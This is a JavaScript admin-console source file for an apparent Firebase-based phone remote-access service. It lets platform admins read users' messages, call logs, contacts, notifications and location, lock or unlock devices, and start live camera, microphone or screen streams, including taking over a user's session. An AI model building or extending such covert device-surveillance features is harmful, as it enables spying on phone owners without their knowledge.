import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-app.js";
import {
  getAuth,
  GoogleAuthProvider,
  onAuthStateChanged,
  signInWithPopup,
  signInWithEmailAndPassword,
  signOut,
} from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
import { startAdminLiveViewer } from "./live.js?v=2";

const viewLogin = document.getElementById("view-login");
const viewDenied = document.getElementById("view-denied");
const viewApp = document.getElementById("view-app");
const authStatus = document.getElementById("auth-status");
const adminUser = document.getElementById("admin-user");
const deniedEmail = document.getElementById("denied-email");

/** @type {string} */
let idToken = "";
/** @type {import("https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js").Auth | null} */
let auth = null;
/** @type {object | null} */
let firebaseConfig = null;
/** @type {string} */
let activeTab = "dashboard";
/** @type {object[]} */
let cachedUsers = [];
/** @type {{ stop: () => Promise<void> } | null} */
let liveViewer = null;
/** @type {{ ownerUid: string, deviceId: string, data: object } | null} */
let exploreCtx = null;

function show(el, on) {
  if (!el) return;
  el.hidden = !on;
}

function fmtTime(ms) {
  const n = Number(ms || 0);
  if (!n) return "—";
  try {
    return new Date(n).toLocaleString();
  } catch {
    return "—";
  }
}

class ApiError extends Error {
  constructor(message, code, howTo, extra) {
    super(message);
    this.code = code || "";
    this.howTo = howTo || "";
    this.extra = extra || null;
  }
}

async function api(path, options = {}) {
  if (!idToken) throw new Error("Not signed in");
  const res = await fetch(path, {
    ...options,
    headers: {
      Authorization: `Bearer ${idToken}`,
      ...(options.body ? { "Content-Type": "application/json" } : {}),
      ...(options.headers || {}),
    },
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new ApiError(
      data.error || data.message || `HTTP ${res.status}`,
      data.code || "",
      data.howTo || "",
      data
    );
  }
  return data;
}

function formatApiError(e) {
  if (e instanceof ApiError) {
    return e.howTo ? `${e.message}\n\nHow: ${e.howTo}` : e.message;
  }
  return e instanceof Error ? e.message : String(e);
}

function setTab(tab) {
  activeTab = tab;
  document.querySelectorAll(".admin-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-tab") === tab);
  });
  document.querySelectorAll(".admin-panel").forEach((panel) => {
    panel.hidden = panel.id !== `tab-${tab}`;
  });
  if (tab === "dashboard") void loadDashboard();
  if (tab === "users") void loadUsers();
  if (tab === "admins") void loadAdmins();
}

async function loadDashboard() {
  const status = document.getElementById("dashboard-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/stats");
    document.getElementById("kpi-users").textContent = String(data.users ?? 0);
    document.getElementById("kpi-devices").textContent = String(data.devices ?? 0);
    document.getElementById("kpi-online").textContent = String(data.online ?? 0);
    document.getElementById("kpi-blocked").textContent = String(data.blocked ?? 0);
    if (status) status.textContent = "Updated just now.";
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

function renderUsers(users) {
  const tbody = document.getElementById("users-tbody");
  if (!tbody) return;
  if (!users.length) {
    tbody.innerHTML = `<tr><td colspan="6" class="muted">No users yet. Click Sync users.</td></tr>`;
    return;
  }
  tbody.innerHTML = users
    .map((u) => {
      const badge = u.blocked
        ? `<span class="admin-badge danger">Blocked</span>`
        : `<span class="admin-badge ok">Active</span>`;
      const email = escapeHtml(u.email || u.uid);
      return `<tr>
        <td>
          <div>${email}</div>
          <div class="muted" style="font-size:0.8rem;">${escapeHtml(u.displayName || "")}</div>
        </td>
        <td>${Number(u.deviceCount || 0)}</td>
        <td>${Number(u.onlineDeviceCount || 0)}</td>
        <td>${fmtTime(u.lastSeenAt)}</td>
        <td>${badge}</td>
        <td><button type="button" class="btn-secondary btn-user-open" data-uid="${escapeHtml(u.uid)}">Open</button></td>
      </tr>`;
    })
    .join("");
  tbody.querySelectorAll(".btn-user-open").forEach((btn) => {
    btn.addEventListener("click", () => openUser(btn.getAttribute("data-uid")));
  });
}

async function loadUsers() {
  const status = document.getElementById("users-status-text");
  const q = document.getElementById("users-search")?.value || "";
  const st = document.getElementById("users-status")?.value || "all";
  try {
    if (status) status.textContent = "Loading…";
    const params = new URLSearchParams();
    if (q) params.set("q", q);
    if (st) params.set("status", st);
    const data = await api(`/api/admin/users?${params.toString()}`);
    cachedUsers = data.users || [];
    renderUsers(cachedUsers);
    if (status) status.textContent = `${cachedUsers.length} user(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

async function loadAdmins() {
  const list = document.getElementById("admins-list");
  const status = document.getElementById("admins-status");
  try {
    if (status) status.textContent = "Loading…";
    const data = await api("/api/admin/admins");
    const emails = data.emails || [];
    if (!list) return;
    list.innerHTML = emails
      .map(
        (email) => `<li>
          <span>${escapeHtml(email)}</span>
          <button type="button" class="btn-danger-soft btn-admin-remove" data-email="${escapeHtml(email)}">Remove</button>
        </li>`
      )
      .join("");
    list.querySelectorAll(".btn-admin-remove").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const email = btn.getAttribute("data-email");
        if (!email) return;
        if (!confirm(`Remove admin ${email}?`)) return;
        try {
          await api("/api/admin/admins", {
            method: "DELETE",
            body: JSON.stringify({ email }),
          });
          await loadAdmins();
        } catch (e) {
          alert(e instanceof Error ? e.message : String(e));
        }
      });
    });
    if (status) status.textContent = `${emails.length} admin(s)`;
  } catch (e) {
    if (status) status.textContent = e instanceof Error ? e.message : String(e);
  }
}

function closeDrawer() {
  show(document.getElementById("user-drawer"), false);
}

function wireDeviceDrawer() {
  document.getElementById("btn-device-drawer-close")?.addEventListener("click", closeDeviceDrawer);
  document.getElementById("device-drawer")?.addEventListener("click", (ev) => {
    if (ev.target === document.getElementById("device-drawer")) closeDeviceDrawer();
  });
}

async function openUser(uid) {
  if (!uid) return;
  const drawer = document.getElementById("user-drawer");
  const body = document.getElementById("drawer-body");
  const title = document.getElementById("drawer-title");
  const sub = document.getElementById("drawer-sub");
  const actions = document.getElementById("drawer-actions");
  show(drawer, true);
  if (body) body.textContent = "Loading…";
  try {
    const data = await api(`/api/admin/users/${encodeURIComponent(uid)}`);
    const u = data.user || {};
    if (title) title.textContent = u.email || u.uid;
    if (sub) {
      sub.textContent = `${u.blocked ? "Blocked" : "Active"} · ${u.deviceCount || 0} device(s) · last seen ${fmtTime(u.lastSeenAt)}`;
    }
    if (actions) {
      actions.innerHTML = u.blocked
        ? `<button type="button" class="btn-primary" id="btn-unblock">Unblock</button>`
        : `<button type="button" class="btn-danger" id="btn-block">Block user</button>`;
      document.getElementById("btn-block")?.addEventListener("click", async () => {
        const reason = prompt("Block reason (shown to the user):", "Blocked by administrator");
        if (reason == null) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/block`, {
          method: "POST",
          body: JSON.stringify({ reason }),
        });
        await openUser(uid);
        await loadUsers();
        await loadDashboard();
      });
      document.getElementById("btn-unblock")?.addEventListener("click", async () => {
        if (!confirm("Unblock this user?")) return;
        await api(`/api/admin/users/${encodeURIComponent(uid)}/unblock`, {
          method: "POST",
          body: JSON.stringify({}),
        });
        await openUser(uid);
        await loadUsers();
        await loadDashboard();
      });
    }

    const devices = data.devices || [];
    const clients = data.trustedClients || [];
    const sessions = data.sessions || [];
    const audits = data.auditLogs || [];

    if (body) {
      body.innerHTML = `
        <h3>Devices</h3>
        <p class="muted">Open a device to explore data and control it (does not revoke user browsers).</p>
        ${
          devices.length
            ? `<ul>${devices
                .map(
                  (d) =>
                    `<li style="margin-bottom:10px;">
                      <strong>${escapeHtml(d.deviceName || d.deviceId)}</strong> — ${escapeHtml(d.deviceModel || "")} · ${d.online ? "online" : "offline"} · app ${escapeHtml(d.appVersion || "?")} ${d.revoked ? "· revoked" : ""}
                      <div style="margin-top:6px;">
                        <button type="button" class="btn-primary btn-explore-device" data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}" ${d.revoked ? "disabled" : ""}>Explore &amp; control</button>
                      </div>
                    </li>`
                )
                .join("")}</ul>`
            : `<p>No devices registered.</p>`
        }
        <h3>Trusted browsers</h3>
        ${
          clients.length
            ? `<ul>${clients
                .map(
                  (c) =>
                    `<li>${escapeHtml(c.label || c.clientId)} — ${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")} ${c.revoked ? "· revoked" : ""}${c.clientId === "platform_admin" || c.isPlatformAdminClient ? " · <em>admin</em>" : ""}</li>`
                )
                .join("")}</ul>`
            : `<p>No trusted browsers.</p>`
        }
        <h3>Recent sessions</h3>
        ${
          sessions.length
            ? `<ul>${sessions
                .slice(0, 15)
                .map(
                  (s) =>
                    `<li>${escapeHtml(s.sessionKind || "session")} · ${escapeHtml(s.status || "")} · ${fmtTime(s.createdAt)}</li>`
                )
                .join("")}</ul>`
            : `<p>No sessions.</p>`
        }
        <h3>Recent audit</h3>
        ${
          audits.length
            ? `<ul>${audits
                .slice(0, 20)
                .map((a) => `<li>${escapeHtml(a.action || "?")} · ${fmtTime(a.at)}</li>`)
                .join("")}</ul>`
            : `<p>No audit logs.</p>`
        }
        ${
          u.blocked
            ? `<h3>Block info</h3><p>${escapeHtml(u.blockedReason || "")}<br/><span class="muted">by ${escapeHtml(u.blockedBy || "?")} at ${fmtTime(u.blockedAt)}</span></p>`
            : ""
        }
      `;
      body.querySelectorAll(".btn-explore-device").forEach((btn) => {
        btn.addEventListener("click", () => {
          void openDeviceExplore(btn.getAttribute("data-uid"), btn.getAttribute("data-device"));
        });
      });
    }
  } catch (e) {
    if (body) body.textContent = e instanceof Error ? e.message : String(e);
  }
}

function closeDeviceDrawer() {
  void stopLiveViewer();
  show(document.getElementById("device-drawer"), false);
  exploreCtx = null;
}

async function stopLiveViewer() {
  if (liveViewer) {
    try {
      await liveViewer.stop();
    } catch {
      /* ignore */
    }
    liveViewer = null;
  }
}

async function openDeviceExplore(ownerUid, deviceId) {
  if (!ownerUid || !deviceId) return;
  const drawer = document.getElementById("device-drawer");
  const body = document.getElementById("device-drawer-body");
  const title = document.getElementById("device-drawer-title");
  const sub = document.getElementById("device-drawer-sub");
  show(drawer, true);
  if (body) body.textContent = "Loading device…";
  try {
    const data = await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}`
    );
    exploreCtx = { ownerUid, deviceId, data };
    const d = data.device || {};
    if (title) title.textContent = d.deviceName || deviceId;
    if (sub) {
      sub.textContent = `${d.deviceModel || ""} · ${d.online ? "online" : "offline"} · ${ownerUid}`;
    }
    renderDeviceExplore("overview");
  } catch (e) {
    if (body) body.textContent = formatApiError(e);
  }
}

function renderDeviceExplore(tab) {
  const body = document.getElementById("device-drawer-body");
  if (!body || !exploreCtx) return;
  const { ownerUid, deviceId, data } = exploreCtx;
  const d = data.device || {};
  const tabs = [
    ["overview", "Overview"],
    ["live", "Live"],
    ["controls", "Controls"],
    ["messages", "Messages"],
    ["calls", "Call logs"],
    ["contacts", "Contacts"],
    ["notifications", "Notifications"],
    ["apps", "Apps"],
    ["limits", "What’s possible"],
  ];
  const tabBar = tabs
    .map(
      ([id, label]) =>
        `<button type="button" data-dtab="${id}" class="${id === tab ? "active" : ""}">${label}</button>`
    )
    .join("");

  let panel = "";
  if (tab === "overview") {
    panel = `
      <div class="admin-cmd-row">
        <button type="button" class="btn-secondary" id="btn-dev-refresh">Refresh data</button>
        <button type="button" class="btn-secondary" id="btn-dev-sync-info">Sync device info</button>
        <button type="button" class="btn-secondary" id="btn-dev-sync-loc">Request location</button>
      </div>
      <p id="device-action-status" class="muted" aria-live="polite"></p>
      <h3>Device</h3>
      <pre class="admin-pre">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
      <h3>Device info (cached)</h3>
      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.deviceInfo || { note: "No cached info — tap Sync device info" }, null, 2))}</pre>
      <h3>Location (cached)</h3>
      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.location || { note: "No cached location — tap Request location" }, null, 2))}</pre>
      <h3>Active sessions</h3>
      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.activeSessions || [], null, 2))}</pre>
    `;
  } else if (tab === "live") {
    panel = `
      <p class="muted">Starts live media via Platform Admin client. User browsers stay paired. Screen capture still needs Android system consent on the phone.</p>
      <div class="admin-cmd-row">
        <button type="button" class="btn-primary" id="btn-live-cam">Start camera + mic</button>
        <button type="button" class="btn-secondary" id="btn-live-screen">Start screen mirror</button>
        <button type="button" class="btn-danger-soft" id="btn-live-stop">Stop live</button>
      </div>
      <p id="live-status" class="muted" aria-live="polite"></p>
      <video id="admin-live-video" class="admin-live-video" autoplay playsinline muted></video>
    `;
  } else if (tab === "controls") {
    panel = `
      <p class="muted">These commands do not revoke user browsers. They may briefly wake the phone app.</p>
      <div class="admin-cmd-row">
        <button type="button" class="btn-secondary" data-action="DEVICE_INFO_REFRESH">Sync info</button>
        <button type="button" class="btn-secondary" data-action="LOCATION_GET_CURRENT">Location now</button>
        <button type="button" class="btn-secondary" data-action="MESSAGES_SYNC">Sync messages</button>
        <button type="button" class="btn-secondary" data-action="CALL_LOGS_SYNC">Sync call logs</button>
        <button type="button" class="btn-secondary" data-action="CONTACTS_SYNC">Sync contacts</button>
        <button type="button" class="btn-secondary" data-action="NOTIFICATIONS_SYNC">Sync notifications</button>
        <button type="button" class="btn-secondary" data-action="APPS_INDEX">Sync apps</button>
        <button type="button" class="btn-secondary" data-action="SCREEN_LOCK">Lock screen</button>
        <button type="button" class="btn-secondary" data-action="SCREEN_UNLOCK">Unlock / wake</button>
      </div>
      <p id="device-action-status" class="muted" aria-live="polite"></p>
      <p class="muted">Remote touch / accessibility: use the user’s website with their paired browser if deep remote control is already set up, or enable Accessibility on the phone then use A11y commands from a future admin build. Lock/unlock and sync work from here without extra pairing.</p>
    `;
  } else if (tab === "messages") {
    panel = listPanel("Messages", data.messages, "Sync messages from Controls if empty.");
  } else if (tab === "calls") {
    panel = listPanel("Call logs", data.callLogs, "Sync call logs from Controls if empty.");
  } else if (tab === "contacts") {
    panel = listPanel("Contacts", data.contacts, "Sync contacts from Controls if empty.");
  } else if (tab === "notifications") {
    panel = listPanel("Notifications", data.notifications, "Sync notifications from Controls if empty.");
  } else if (tab === "apps") {
    panel = listPanel("Installed apps", data.apps, "Sync apps from Controls if empty.");
  } else if (tab === "limits") {
    panel = `<h3>What’s possible</h3>${(data.limitations || [])
      .map(
        (l) => `<div class="admin-limit-card">
          <strong>${escapeHtml(l.feature)} — ${l.possible ? "Possible" : "Blocked"}</strong>
          <span class="muted">${escapeHtml(l.note)}</span>
        </div>`
      )
      .join("")}`;
  }

  body.innerHTML = `<div class="admin-device-tabs">${tabBar}</div><div>${panel}</div>`;
  body.querySelectorAll("[data-dtab]").forEach((btn) => {
    btn.addEventListener("click", () => renderDeviceExplore(btn.getAttribute("data-dtab") || "overview"));
  });

  document.getElementById("btn-dev-refresh")?.addEventListener("click", () => {
    void openDeviceExplore(ownerUid, deviceId);
  });
  document.getElementById("btn-dev-sync-info")?.addEventListener("click", () => {
    void runDeviceCommand(ownerUid, deviceId, "DEVICE_INFO_REFRESH");
  });
  document.getElementById("btn-dev-sync-loc")?.addEventListener("click", () => {
    void runDeviceCommand(ownerUid, deviceId, "LOCATION_GET_CURRENT");
  });
  body.querySelectorAll("[data-action]").forEach((btn) => {
    btn.addEventListener("click", () => {
      void runDeviceCommand(ownerUid, deviceId, btn.getAttribute("data-action"));
    });
  });
  document.getElementById("btn-live-cam")?.addEventListener("click", () => {
    void startLive(ownerUid, deviceId, ["camera", "microphone"], false);
  });
  document.getElementById("btn-live-screen")?.addEventListener("click", () => {
    void startLive(ownerUid, deviceId, ["screenMirror"], false);
  });
  document.getElementById("btn-live-stop")?.addEventListener("click", async () => {
    await stopLiveViewer();
    const st = document.getElementById("live-status");
    if (st) st.textContent = "Live viewer stopped.";
  });
}

function listPanel(title, items, emptyHint) {
  const arr = Array.isArray(items) ? items : [];
  if (!arr.length) {
    return `<h3>${escapeHtml(title)}</h3><p class="muted">${escapeHtml(emptyHint)}</p>`;
  }
  return `<h3>${escapeHtml(title)} (${arr.length})</h3><pre class="admin-pre">${escapeHtml(
    JSON.stringify(arr.slice(0, 40), null, 2)
  )}</pre>`;
}

async function runDeviceCommand(ownerUid, deviceId, action) {
  const status =
    document.getElementById("device-action-status") || document.getElementById("live-status");
  try {
    if (status) status.textContent = `Sending ${action}…`;
    await api(
      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/command`,
      { method: "POST", body: JSON.stringify({ action, payload: {} }) }
    );
    if (status) status.textContent = `${action} sent. Refresh in a few seconds for new cached data.`;
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

async function startLive(ownerUid, deviceId, capabilities, forceReplace) {
  const status = document.getElementById("live-status");
  const video = document.getElementById("admin-live-video");
  try {
    await stopLiveViewer();
    if (status) status.textContent = "Starting live session…";
    let result;
    try {
      result = await api(
        `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
        {
          method: "POST",
          body: JSON.stringify({ capabilities, forceReplace: Boolean(forceReplace) }),
        }
      );
    } catch (e) {
      if (e instanceof ApiError && e.code === "USER_SESSION_ACTIVE") {
        const ok = confirm(
          `${e.message}\n\n${e.howTo || ""}\n\nTake over now? (Ends their same-type live session only.)`
        );
        if (!ok) {
          if (status) status.textContent = "Cancelled — user session left running.";
          return;
        }
        result = await api(
          `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/session/start`,
          {
            method: "POST",
            body: JSON.stringify({ capabilities, forceReplace: true }),
          }
        );
      } else {
        throw e;
      }
    }
    if (!firebaseConfig) throw new Error("Firebase config missing");
    if (!video) throw new Error("Video element missing");
    if (status) status.textContent = result.notes || "Connecting WebRTC…";
    liveViewer = await startAdminLiveViewer({
      firebaseConfig,
      customToken: result.customToken,
      ownerUid: result.ownerUid,
      sessionId: result.sessionId,
      iceServers: Array.isArray(result.iceServers)
        ? result.iceServers
        : result.iceServers?.iceServers || [],
      videoEl: video,
      onStatus: (m) => {
        if (status) status.textContent = m;
      },
    });
  } catch (e) {
    if (status) status.textContent = formatApiError(e);
    else alert(formatApiError(e));
  }
}

function escapeHtml(s) {
  return String(s || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

async function enterAdmin(user) {
  idToken = await user.getIdToken(true);
  const me = await api("/api/admin/me");
  if (!me.isAdmin) {
    show(viewLogin, false);
    show(viewApp, false);
    show(viewDenied, true);
    if (deniedEmail) deniedEmail.textContent = `Signed in as ${user.email || user.uid}`;
    return;
  }
  show(viewLogin, false);
  show(viewDenied, false);
  show(viewApp, true);
  if (adminUser) adminUser.textContent = me.email || user.email || "";
  setTab(activeTab || "dashboard");
}

function setLoggedOut() {
  idToken = "";
  show(viewApp, false);
  show(viewDenied, false);
  show(viewLogin, true);
  closeDrawer();
}

async function main() {
  const cfgRes = await fetch("/api/config");
  if (!cfgRes.ok) throw new Error("Failed to load /api/config");
  const cfg = await cfgRes.json();
  firebaseConfig = cfg.firebase;
  const app = initializeApp(cfg.firebase);
  auth = getAuth(app);

  document.querySelectorAll(".admin-tab").forEach((btn) => {
    btn.addEventListener("click", () => setTab(btn.getAttribute("data-tab") || "dashboard"));
  });
  document.getElementById("btn-users-refresh")?.addEventListener("click", () => loadUsers());
  document.getElementById("users-search")?.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") void loadUsers();
  });
  document.getElementById("users-status")?.addEventListener("change", () => loadUsers());
  document.getElementById("btn-drawer-close")?.addEventListener("click", closeDrawer);
  document.getElementById("user-drawer")?.addEventListener("click", (ev) => {
    if (ev.target === document.getElementById("user-drawer")) closeDrawer();
  });
  wireDeviceDrawer();

  document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
    const input = document.getElementById("admin-email-input");
    const email = String(input?.value || "").trim();
    if (!email) return;
    try {
      await api("/api/admin/admins", { method: "POST", body: JSON.stringify({ email }) });
      if (input) input.value = "";
      await loadAdmins();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });

  document.getElementById("btn-sync")?.addEventListener("click", async () => {
    const status = document.getElementById("dashboard-status");
    try {
      if (status) status.textContent = "Syncing from Firebase Auth…";
      const data = await api("/api/admin/sync-users", { method: "POST", body: "{}" });
      if (status) status.textContent = `Synced ${data.synced || 0} user(s).`;
      await loadDashboard();
      if (activeTab === "users") await loadUsers();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });

  document.getElementById("btn-logout")?.addEventListener("click", () => signOut(auth));
  document.getElementById("btn-denied-logout")?.addEventListener("click", () => signOut(auth));

  document.getElementById("btn-login-email")?.addEventListener("click", async () => {
    const email = document.getElementById("auth-email")?.value?.trim();
    const password = document.getElementById("auth-password")?.value || "";
    if (!email || !password) {
      if (authStatus) authStatus.textContent = "Enter email and password.";
      return;
    }
    try {
      if (authStatus) authStatus.textContent = "Signing in…";
      await signInWithEmailAndPassword(auth, email, password);
    } catch (e) {
      if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
    }
  });

  document.getElementById("btn-login-google")?.addEventListener("click", async () => {
    try {
      if (authStatus) authStatus.textContent = "Opening Google…";
      await signInWithPopup(auth, new GoogleAuthProvider());
    } catch (e) {
      if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
    }
  });

  onAuthStateChanged(auth, async (user) => {
    if (!user) {
      setLoggedOut();
      return;
    }
    try {
      if (authStatus) authStatus.textContent = "Checking admin access…";
      await enterAdmin(user);
    } catch (e) {
      if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
      setLoggedOut();
    }
  });
}

main().catch((e) => {
  if (authStatus) authStatus.textContent = e instanceof Error ? e.message : String(e);
});
